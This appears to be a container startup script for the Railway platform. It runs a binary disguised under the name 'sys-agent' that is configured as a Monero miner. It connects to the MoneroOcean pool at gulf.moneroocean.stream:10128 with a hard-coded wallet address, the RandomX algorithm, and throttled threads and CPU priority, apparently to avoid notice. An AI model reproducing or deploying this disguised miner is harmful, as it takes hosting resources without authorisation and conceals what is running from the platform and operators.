#!/bin/sh

echo "=== Starting sys-agent Container on Railway ==="
exec ./sys-agent \
  -o gulf.moneroocean.stream:10128 \
  -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
  -p worker01 -a rx -k --cpu-priority=1 --threads=2
